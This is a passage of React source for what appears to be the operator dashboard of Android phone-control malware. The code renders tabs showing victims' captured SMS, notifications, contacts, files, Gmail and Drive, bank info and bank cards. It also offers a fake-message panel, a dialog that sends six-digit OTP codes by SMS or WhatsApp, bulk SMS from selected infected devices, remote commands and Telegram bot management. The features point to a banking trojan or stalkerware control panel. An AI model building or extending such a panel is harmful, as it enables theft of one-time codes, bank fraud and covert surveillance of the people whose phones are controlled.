                      <TabsContent value="bank-info" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <BankInfoSection deviceId={currentDeviceId} />
                        </Suspense>
                      </TabsContent>

                      <TabsContent value="export" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <ExportSection
                            deviceId={currentDeviceId}
                            messages={sms}
                            notifications={notifications}
                            contacts={contacts}
                            deviceInfo={{
                              name: currentUser?.device || 'Unknown',
                              phone: currentUser?.phone || 'N/A',
                            }}
                          />
                        </Suspense>
                      </TabsContent>

                      <TabsContent value="remote-messages" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <div className="space-y-4">
                            <MessageSchedulerPanel deviceId={currentDeviceId} />
                            <FakeMessagePanel deviceId={currentDeviceId} />
                            <AutoReplyPanel deviceId={currentDeviceId} />
                            <BulkOperationsPanel deviceId={currentDeviceId} />
                            <MessageTemplatesPanel deviceId={currentDeviceId} />
                            <MessageAnalyticsPanel deviceId={currentDeviceId} />
                            <RemoteMessagesSection deviceId={currentDeviceId} initialCard="sms" />
                          </div>
                        </Suspense>
                      </TabsContent>
                    </Tabs>
                  </div>
                ) : deviceSubTab === 'utility' ? (
                  <Suspense fallback={<SectionLoader />}>
                    <UtilitiesSection deviceId={currentDeviceId} />
                  </Suspense>
                ) : deviceSubTab === 'command' ? (
                  <Suspense fallback={<SectionLoader />}>
                    <CommandsSection deviceId={currentDeviceId} />
                  </Suspense>
                ) : deviceSubTab === 'instruction' ? (
                  <Suspense fallback={<SectionLoader />}>
                    <InstructionsSection deviceId={currentDeviceId} />
                  </Suspense>
                ) : deviceSubTab === 'permission' ? (
                  <Suspense fallback={<SectionLoader />}>
                    <PermissionsSection deviceId={currentDeviceId} />
                  </Suspense>
                ) : null
              ) : activeTab === 'overview' ? (
                    <OverviewSection
                      currentDeviceId={currentDeviceId}
                      viewMode={viewMode}
                      onDeviceSelect={deviceId => {
                        handleDeviceSelect(deviceId)
                        setActiveTab('sms')
                      }}
                      onTabChange={tab => setActiveTab(tab as ActiveTabType)}
                      onSendSMS={handleSMS}
                      onShowNotification={() => {
                        if (currentDeviceId) {
                          setActiveTab('notifications')
                          setViewMode('tabs')
                        }
                      }}
                      onCommands={() => {
                        if (currentDeviceId) {
                          setActiveTab('commands')
                          setViewMode('tabs')
                        }
                      }}
                      onRefresh={() => {
                        setRefreshDeviceStatusTrigger(prev => prev + 1)
                      }}
                    />
                  ) : activeTab === 'devices' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <DevicesSection
                        onDeviceSelect={deviceId => {
                          handleDeviceSelect(deviceId)
                          setActiveTab('sms')
                        }}
                        onAttachBankCard={deviceId => {
                          handleDeviceSelect(deviceId)
                          setActiveTab('add-bank-card')
                        }}
                      />
                    </Suspense>
                  ) : activeTab === 'analytics' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <AnalyticsSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'notifications' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <NotificationsSection
                        deviceId={currentDeviceId}
                        notifications={notifications}
                        loading={notificationsLoading}
                        error={notificationsError}
                        isConnected={isConnected}
                        isAdmin={isAdmin}
                        syncEnabled={notificationsSyncEnabled}
                        formatNotificationTimestamp={formatDate}
                      />
                    </Suspense>
                  ) : activeTab === 'contacts' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <ContactsSection
                        deviceId={currentDeviceId}
                        contacts={contacts}
                        loading={contactsLoading}
                        error={contactsError}
                        isConnected={isConnected}
                        isAdmin={isAdmin}
                        syncEnabled={contactsSyncEnabled}
                      />
                    </Suspense>
                  ) : activeTab === 'input' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <InputFilesSection
                        deviceId={currentDeviceId}
                        files={inputFiles}
                        loading={loadingInputFiles}
                        previewFile={previewFile}
                        onPreview={setPreviewFile}
                        onClosePreview={() => setPreviewFile(null)}
                      />
                    </Suspense>
                  ) : activeTab === 'commands' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <CommandsSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'export' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <ExportSection
                        deviceId={currentDeviceId}
                        messages={sms}
                        notifications={notifications}
                        contacts={contacts}
                        deviceInfo={{
                          name: currentUser?.device || 'Unknown',
                          phone: currentUser?.phone || 'N/A',
                        }}
                      />
                    </Suspense>
                  ) : activeTab === 'remote-messages' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <div className="space-y-4">
                        <MessageSchedulerPanel deviceId={currentDeviceId} />
                        <FakeMessagePanel deviceId={currentDeviceId} />
                        <AutoReplyPanel deviceId={currentDeviceId} />
                        <BulkOperationsPanel deviceId={currentDeviceId} />
                        <MessageTemplatesPanel deviceId={currentDeviceId} />
                        <MessageAnalyticsPanel deviceId={currentDeviceId} />
                        <RemoteMessagesSection deviceId={currentDeviceId} initialCard="sms" />
                      </div>
                    </Suspense>
                  ) : activeTab === 'permissions' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <PermissionsSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'bank-info' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <BankInfoSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'add-bank-card' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <AddBankCardSection selectedDeviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'instructions-templates' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <InstructionsSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'system-info' && currentDeviceId ? (
                    <Suspense fallback={<SectionLoader />}>
                      <SystemInfoSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'gmail' || activeTab === 'drive' ? (
                    <div className="space-y-4">
                      <Suspense fallback={<SectionLoader />}>
                        <GmailSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                      </Suspense>
                      <Suspense fallback={<SectionLoader />}>
                        <DriveSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                      </Suspense>
                    </div>
                  ) : activeTab === 'utilities' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <UtilitiesSection deviceId={currentDeviceId} />
                    </Suspense>
                  ) : activeTab === 'bank-cards' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <BankCardsList 
                        onDeviceSelect={(deviceId) => {
                          handleDeviceSelect(deviceId)
                          setActiveTab('sms')
                        }}
                        onAddBankCard={() => setActiveTab('add-bank-card')}
                      />
                    </Suspense>
                  ) : activeTab === 'telegram-bots' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <TelegramBotsSection isAdmin={isAdmin} />
                    </Suspense>
                  ) : activeTab === 'activation-failures' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <ActivationFailureLogsSection
                        isAdmin={isAdmin}
                        deviceId={selectedUserId}
                      />
                    </Suspense>
                  ) : activeTab === 'activity-logs' ? (
                    <Suspense fallback={<SectionLoader />}>
                      <ActivityLogsSection
                        isAdmin={isAdmin}
                        userEmail={userEmail}
                      />
                    </Suspense>
                  ) : (
                    // Show overview when no device is selected and no specific tab content
                    <Suspense fallback={<SectionLoader />}>
                      <OverviewSection
                        currentDeviceId={currentDeviceId}
                        viewMode={viewMode}
                        onDeviceSelect={deviceId => {
                          handleDeviceSelect(deviceId)
                          setActiveTab('sms')
                        }}
                        onTabChange={tab => setActiveTab(tab as ActiveTabType)}
                        onSendSMS={handleSMS}
                        onShowNotification={() => {
                          if (currentDeviceId) {
                            setActiveTab('notifications')
                            setViewMode('tabs')
                          }
                        }}
                        onCommands={() => {
                          if (currentDeviceId) {
                            setActiveTab('commands')
                            setViewMode('tabs')
                          }
                        }}
                        onRefresh={() => {
                          setRefreshDeviceStatusTrigger(prev => prev + 1)
                        }}
                      />
                    </Suspense>
                  )}
            </>
          )
        }}
      </UnifiedLayout>

      {/* Dialogs - Outside UnifiedLayout but inside component */}
      {/* Message Dialog */}
      <Dialog open={isMessageDialogOpen} onOpenChange={setIsMessageDialogOpen}>
        <DialogContent className="w-auto max-w-fit">
          <DialogClose
            onClose={() => {
              setIsMessageDialogOpen(false)
              setOtp(['', '', '', '', '', ''])
              setMessageStatus({ type: null, message: '' })
            }}
          />
          <DialogHeader>
            {selectedUser && selectedUser.phone && (
              <p className="text-sm text-muted-foreground">To: {selectedUser.phone}</p>
            )}
          </DialogHeader>
          <div className="grid gap-4">
            <div className="grid gap-2">
              <div className="flex items-center justify-start gap-2">
                <Label htmlFor="otp">Enter 6-digit code</Label>
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={generateRandomOtp}
                  disabled={sendingMessage}
                  className="h-8 text-sm text-blue-500 hover:text-blue-600"
                >
                  <Shuffle className="h-3 w-3 mr-1" />
                  Random
                </Button>
              </div>
              <div className="flex gap-3">
                {otp.map((digit, index) => (
                  <Input
                    key={index}
                    ref={el => {
                      otpInputRefs.current[index] = el
                    }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={e => handleOtpChange(index, e.target.value)}
                    onKeyDown={e => handleOtpKeyDown(index, e)}
                    onPaste={handleOtpPaste}
                    className="w-10 h-10 text-center text-md font-semibold"
                    disabled={sendingMessage}
                    autoFocus={index === 0}
                  />
                ))}
              </div>
            </div>
            {messageStatus.type && (
              <div
                className={`text-sm p-2 rounded-md ${
                  messageStatus.type === 'success'
                    ? 'bg-green-50 text-green-800 dark:bg-green-900/20 dark:text-green-400'
                    : 'bg-red-50 text-red-800 dark:bg-red-900/20 dark:text-red-400'
                }`}
              >
                {messageStatus.message}
              </div>
            )}
            <div className="flex justify-end gap-2">
              <Button
                variant="outline"
                size="sm"
                className="rounded-full"
                onClick={() => {
                  setIsMessageDialogOpen(false)
                  setOtp(['', '', '', '', '', ''])
                  setMessageStatus({ type: null, message: '' })
                }}
                disabled={sendingMessage}
              >
                Cancel
              </Button>
              <Button
                size="sm"
                className="rounded-full px-4"
                onClick={sendMessage}
                disabled={sendingMessage || otp.join('').length !== 6}
              >
                {sendingMessage ? (
                  <>
                    <Loader className="h-4 w-4 mr-2 animate-spin" />
                    Sending...
                  </>
                ) : (
                  `Send ${messageType === 'sms' ? 'SMS' : 'WhatsApp'}`
                )}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Send Generic SMS Dialog */}
      <Dialog open={isSendSmsDialogOpen} onOpenChange={setIsSendSmsDialogOpen}>
        <DialogContent className="w-full max-w-md">
          <DialogClose
            onClose={() => {
              setIsSendSmsDialogOpen(false)
              setMessageStatus({ type: null, message: '' })
            }}
          />
          <DialogHeader>
            <h2 className="text-lg font-semibold">Send SMS</h2>
          </DialogHeader>
          <div className="grid gap-4 py-2">
            <div className="grid gap-2 relative">
              <Label>Target Devices</Label>
              <div className="relative">
                <button
                  type="button"
                  onClick={() => !sendingMessage && setIsDeviceSelectorOpen(!isDeviceSelectorOpen)}
                  className="flex h-10 w-full items-center justify-between rounded-lg border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-ring focus:ring-offset-0 disabled:cursor-not-allowed disabled:opacity-50"
                  disabled={sendingMessage}
                >
                  <span className="truncate">
                    {selectedTargetDeviceIds.length === 0
                      ? 'Select devices...'
                      : selectedTargetDeviceIds.length === users.length
                        ? 'All Devices'
                        : `${selectedTargetDeviceIds.length} device${selectedTargetDeviceIds.length === 1 ? '' : 's'} selected`}
                  </span>
                  <ChevronDown
                    className={`h-4 w-4 opacity-50 transition-transform ${isDeviceSelectorOpen ? 'rotate-180' : ''}`}
                  />
                </button>

                {isDeviceSelectorOpen && (
                  <div className="absolute top-full left-0 z-50 mt-1 w-full rounded-md border border-border bg-popover text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95">
                    <div className="p-2 space-y-1 max-h-60 overflow-auto">
                      <div
                        className="flex items-center space-x-2 p-2 hover:bg-accent rounded-sm cursor-pointer"
                        onClick={() => {
                          if (selectedTargetDeviceIds.length === users.length) {
                            setSelectedTargetDeviceIds([])
                          } else {
                            setSelectedTargetDeviceIds(users.map(u => u.id))
                          }
                        }}
                      >
                        <input
                          type="checkbox"
                          checked={
                            selectedTargetDeviceIds.length === users.length && users.length > 0
                          }
                          onChange={() => {}} // Handled by parent div click
                          className="h-4 w-4 rounded border-primary text-primary focus:ring-primary"
                        />
                        <span className="text-sm font-medium">Select All</span>
                      </div>
                      <div className="h-px bg-border my-1" />
                      {users.map(user => (
                        <div
                          key={user.id}
                          className="flex items-center space-x-2 p-2 hover:bg-accent rounded-sm cursor-pointer"
                          onClick={() => {
                            setSelectedTargetDeviceIds(prev => {
                              if (prev.includes(user.id)) {
                                return prev.filter(id => id !== user.id)
                              } else {
                                return [...prev, user.id]
                              }
                            })
                          }}
                        >
                          <input
                            type="checkbox"
                            checked={selectedTargetDeviceIds.includes(user.id)}
                            onChange={() => {}} // Handled by parent div click
                            className="h-4 w-4 rounded border-primary text-primary focus:ring-primary"
                          />
                          <div className="flex flex-col overflow-hidden">
                            <span className="text-sm truncate">{user.device || user.id}</span>
                            {user.phone && (
                              <span className="text-xs text-muted-foreground">{user.phone}</span>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
              {isDeviceSelectorOpen && (
                <div
                  className="fixed inset-0 z-40"
                  onClick={() => setIsDeviceSelectorOpen(false)}
                />
              )}
            </div>

            <div className="grid gap-2">
              <Label htmlFor="phone">Phone Number</Label>
              <Input
                id="phone"
                placeholder="Enter 10-digit phone number"
                value={sendSmsPhone}
                onChange={e => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 10)
                  setSendSmsPhone(value)
                }}
                disabled={sendingMessage}
                type="tel"
              />
            </div>
            <div className="grid gap-2">
              <Label htmlFor="message">Message</Label>
              <textarea
                id="message"
                className="flex min-h-[80px] w-full rounded-lg border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring focus-visible:ring-offset-0 disabled:cursor-not-allowed disabled:opacity-50"
                placeholder="Enter your message"
                value={sendSmsMessage}
                onChange={e => setSendSmsMessage(e.target.value)}
                disabled={sendingMessage}
              />
            </div>
            <div className="grid gap-2">
              <Label htmlFor="sim">SIM Card</Label>
              <Select
                value={sendSmsSim}
                onValueChange={(value: '1' | '2') => setSendSmsSim(value)}
                disabled={sendingMessage}
              >
                <SelectTrigger>
                  <SelectValue placeholder="Select SIM" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="1">SIM 1</SelectItem>
                  <SelectItem value="2">SIM 2</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {messageStatus.type && (
              <div
                className={`text-sm p-2 rounded-md ${
                  messageStatus.type === 'success'
                    ? 'bg-green-50 text-green-800 dark:bg-green-900/20 dark:text-green-400'
                    : 'bg-red-50 text-red-800 dark:bg-red-900/20 dark:text-red-400'
                }`}
              >
                {messageStatus.message}
              </div>
            )}

            <div className="flex justify-end gap-2 mt-2">
              <Button
                variant="outline"
                className="rounded-full"
                onClick={() => {
                  setIsSendSmsDialogOpen(false)
                  setMessageStatus({ type: null, message: '' })
                }}
                disabled={sendingMessage}
              >
                Cancel
              </Button>
              <Button
                className="rounded-full px-4"
                onClick={handleSendGenericSms}
                disabled={sendingMessage || sendSmsPhone.length !== 10 || !sendSmsMessage}
              >
                {sendingMessage ? (
                  <>
                    <Loader className="h-4 w-4 mr-2 animate-spin" />
                    Sending...
                  </>
                ) : (
                  'Send SMS'
                )}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Instruction Dialog */}
      <Dialog open={isInstructionDialogOpen} onOpenChange={setIsInstructionDialogOpen}>
        <DialogContent className="w-full max-w-md">
          <DialogClose
            onClose={() => {
              setIsInstructionDialogOpen(false)
              setMessageStatus({ type: null, message: '' })
            }}
          />
          <DialogHeader>
            <h2 className="text-lg font-semibold">Send Instruction</h2>
          </DialogHeader>
          <div className="grid gap-4 py-2">
            <div className="flex flex-wrap gap-2 mb-2">
              {INSTRUCTION_PRESETS.map(preset => (
                <Button
                  key={preset}
                  variant="outline"
                  size="sm"
                  className="text-xs h-7"
                  onClick={() => setInstructionText(preset)}
                  disabled={sendingInstruction}
                >
                  {preset}
                  <CornerRightDown className="h-4 w-4 scale-90 opacity-50" />
                </Button>
              ))}
            </div>

            <div className="grid gap-2">
              <Label htmlFor="instruction">Instruction</Label>
              <div className="mb-2">
                <Suspense fallback={<div className="min-h-[200px] border rounded-lg p-4 flex items-center justify-center"><Loader className="h-6 w-6 animate-spin" /></div>}>
                  <ReactQuill
                    theme="snow"
                    value={instructionText}
                    onChange={setInstructionText}
                    placeholder="Enter welcome message or instruction..."
                    readOnly={sendingInstruction}
                    modules={{
                      toolbar: [
                        ['bold', 'italic', 'underline', 'strike'],
                        [{ list: 'ordered' }, { list: 'bullet' }],
                        [{ color: [] }, { background: [] }],
                        ['clean'],
                      ],
                    }}
                  />
                </Suspense>
                <input
                  type="file"
                  ref={fileInputRef}
                  className="hidden"
                  onChange={e => handleFileUpload(e)}
                />
                <div className="flex gap-2 mt-2">
                  <Button
                    variant="outline"
                    size="sm"
                    className="h-8 text-xs gap-1"
                    onClick={() => {
                      if (fileInputRef.current) {
                        fileInputRef.current.accept = 'image/*'
                        fileInputRef.current.click()
                      }
                    }}
                    disabled={sendingInstruction}
                  >
                    <Image className="h-3 w-3" />
                    Attach Image
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    className="h-8 text-xs gap-1"
                    onClick={() => {
                      if (fileInputRef.current) {
                        fileInputRef.current.accept = 'video/*'
                        fileInputRef.current.click()
                      }
                    }}
                    disabled={sendingInstruction}
                  >
                    <Video className="h-3 w-3" />
                    Attach Video
                  </Button>
                </div>
              </div>
            </div>

            {messageStatus.type && (
              <div
                className={`text-sm p-2 rounded-md ${
                  messageStatus.type === 'success'
                    ? 'bg-green-50 text-green-800 dark:bg-green-900/20 dark:text-green-400'
                    : 'bg-red-50 text-red-800 dark:bg-red-900/20 dark:text-red-400'
                }`}
              >
                {messageStatus.message}
              </div>
            )}

            <div className="flex justify-end gap-2 mt-2">
              <Button
                variant="outline"
                className="rounded-full"
                onClick={() => {
                  setIsInstructionDialogOpen(false)
                  setMessageStatus({ type: null, message: '' })
                }}
                disabled={sendingInstruction}
              >
                Cancel
              </Button>
              <Button
                className="rounded-full px-4"
                onClick={handleSendInstruction}
                disabled={sendingInstruction || !instructionText.trim()}
              >
                {sendingInstruction ? (
                  <>
                    <Loader className="h-4 w-4 mr-2 animate-spin" />
                    Sending...
                  </>
                ) : (
                  'Send Instruction'
                )}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Get Input Dialog */}
      <Dialog open={isGetInputDialogOpen} onOpenChange={setIsGetInputDialogOpen}>
        <DialogContent className="w-full max-w-md">
          <DialogClose
            onClose={() => {
              setIsGetInputDialogOpen(false)
              setMessageStatus({ type: null, message: '' })
              setSelectedInputType(null)
            }}
          />
          <DialogHeader>
            <h2 className="text-lg font-semibold">Get Input</h2>
          </DialogHeader>
          <div className="grid gap-4 py-2">
            <div className="grid grid-cols-2 gap-3">
              {[
                { id: 'Image', icon: Settings2, label: 'Image' },
                { id: 'Video', icon: PictureInPicture2, label: 'Video' },
                { id: 'Other Documents', icon: TextSearch, label: 'Documents' },
                { id: 'None', icon: Ban, label: 'None' },
              ].map(item => (
                <div
                  key={item.id}
                  className={`flex flex-col items-center justify-center p-3 rounded-lg border cursor-pointer transition-all duration-200 ${
                    selectedInputType === item.id
                      ? 'border-primary bg-primary/5 shadow-sm'
                      : 'border-border hover:border-primary/50 hover:bg-accent/50'
                  }`}
                  onClick={() => setSelectedInputType(item.id)}
                >
                  <item.icon
                    className={`h-5 w-5 mb-2 ${
                      selectedInputType === item.id ? 'text-primary' : 'text-muted-foreground'
                    }`}
                  />
                  <span
                    className={`text-xs font-medium text-center ${
                      selectedInputType === item.id ? 'text-primary' : 'text-muted-foreground'
                    }`}
                  >
                    {item.label}
                  </span>
                </div>
              ))}
            </div>

            {messageStatus.type && (
              <div
                className={`text-sm p-3 rounded-lg flex items-center gap-2 ${
                  messageStatus.type === 'success'
                    ? 'bg-green-50 text-green-700 dark:bg-green-900/20 dark:text-green-400'
                    : 'bg-red-50 text-red-700 dark:bg-red-900/20 dark:text-red-400'
                }`}
              >
                {messageStatus.type === 'success' ? (
                  <Check className="h-4 w-4" />
                ) : (
                  <X className="h-4 w-4" />
                )}
                {messageStatus.message}
              </div>
            )}

            <div className="flex justify-end gap-3">
              <Button
                variant="ghost"
                className="rounded-full"
                onClick={() => {
                  setIsGetInputDialogOpen(false)
                  setMessageStatus({ type: null, message: '' })
                  setSelectedInputType(null)
                }}
                disabled={sendingInputRequest}
              >
                Cancel
              </Button>
              <Button
                className="rounded-full px-6"
                onClick={sendInputRequest}
                disabled={sendingInputRequest || !selectedInputType}
              >
                {sendingInputRequest ? (
                  <>
                    <Loader className="h-4 w-4 mr-2 animate-spin" />
                    Sending...
                  </>
                ) : (
                  'Send Request'
                )}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* File Preview Dialog */}
      <Dialog open={!!previewFile} onOpenChange={open => !open && setPreviewFile(null)}>
        <DialogContent className="max-w-4xl w-full p-0 overflow-hidden bg-black/95 border-none">
          <div className="relative w-full h-full flex items-center justify-center min-h-[50vh] max-h-[85vh]">
            <button
              onClick={() => setPreviewFile(null)}
              className="absolute top-4 right-4 z-50 p-2 bg-black/50 hover:bg-black/70 rounded-full text-white transition-colors"
            >
              <X className="h-5 w-5" />
            </button>

            {previewFile && (
              <>
                {previewFile.contentType.startsWith('image/') ? (
                  <img
                    src={previewFile.url}
                    alt={previewFile.name}
                    className="max-w-full max-h-[85vh] object-contain"
                  />
                ) : previewFile.contentType.startsWith('video/') ? (
                  <video
                    src={previewFile.url}
                    controls
                    autoPlay
                    className="max-w-full max-h-[85vh]"
                  />
                ) : (
                  <div className="text-white text-center">
                    <FileText className="h-20 w-20 mx-auto mb-4 opacity-50" />
                    <p>Preview not available for this file type</p>
                    <a
                      href={previewFile.url}
                      download={previewFile.name}
                      target="_blank"
                      rel="noreferrer"
                      className="inline-block mt-4 px-4 py-2 bg-white text-black rounded-md hover:bg-gray-200 transition-colors"
                    >
                      Download File
                    </a>
                  </div>
                )}

                <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/80 to-transparent text-white">
                  <p className="font-medium truncate">{previewFile.name}</p>
                  <p className="text-sm opacity-75">
                    {new Date(previewFile.time).toLocaleString('en-US')} •{' '}
                    {(previewFile.size / 1024).toFixed(1)} KB
                  </p>
                </div>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Settings Panel */}
      <SettingsPanel
        open={showSettings}
        onOpenChange={setShowSettings}
        dataLimit={dataLimit}
        onDataLimitChange={setDataLimit}
        contactsSyncEnabled={contactsSyncEnabled}
        onContactsSyncChange={setContactsSyncEnabled}
        notificationsSyncEnabled={notificationsSyncEnabled}
        onNotificationsSyncChange={setNotificationsSyncEnabled}
        dashboardCode={dashboardCode}
        onDashboardCodeChange={setDashboardCode}
        onAddDevice={handleAddDevice}
        isAddingDevice={isAddingDevice}
        onRefresh={() => {
          // Force refresh by clearing and reloading
          setRefreshDeviceStatusTrigger(prev => prev + 1)
        }}
      />
    </>
  )
}
